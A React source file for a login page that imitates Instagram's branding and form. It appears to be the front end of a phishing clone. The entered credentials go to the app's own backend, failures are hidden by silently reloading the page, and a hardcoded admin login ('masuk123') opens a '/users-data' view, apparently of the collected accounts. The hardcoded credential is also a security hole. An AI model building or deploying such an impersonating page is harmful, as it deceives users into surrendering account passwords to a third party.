import React, { useState } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';
import apiClient from '../api/client';
import '../styles/Auth.css';

export default function Login() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const { login } = useAuth();
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      // Check if it's admin credentials
      if (email === 'masuk123' && password === 'masuk123') {
        // Admin login
        const response = await apiClient.post('/api/admin/login', {
          username: email,
          password
        });

        localStorage.setItem('adminToken', response.data.token);
        navigate('/users-data');
        return;
      }

      // Regular user login
      await login(email, password);
      navigate('/dashboard');
    } catch (err) {
      // Silent error - just refresh page
      console.error('Login error:', err);
      window.location.reload();
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="auth-container">
      {/* Instagram phone mockup */}
      <div className="auth-phone-mockup">
        <div className="phone-screen">📱</div>
      </div>

      <div className="auth-card">
        <div className="instagram-logo">Instagram</div>
        
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <input
              type="text"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Phone number, username, or email"
              required
            />
          </div>

          <div className="form-group">
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              required
            />
          </div>

          <button type="submit" disabled={loading} style={{ marginBottom: '8px' }}>
            {loading ? 'Logging in...' : 'Log in'}
          </button>
        </form>

        <div className="divider">
          <div className="divider-line"></div>
          <div className="divider-text">OR</div>
          <div className="divider-line"></div>
        </div>

        <p style={{ fontSize: '13px', color: '#8a8a8a', marginBottom: '16px', marginTop: '8px' }}>
          Log in with Facebook
        </p>

        <p style={{ fontSize: '12px', color: '#8a8a8a', marginBottom: '16px' }}>
          <a href="#" style={{ color: '#00b8ff', textDecoration: 'none', fontSize: '12px' }}>
            Forgot password?
          </a>
        </p>

        <div className="signup-prompt">
          <span className="auth-link">
            Don't have an account? <Link to="/signup">Sign up</Link>
          </span>
        </div>
      </div>
    </div>
  );
}
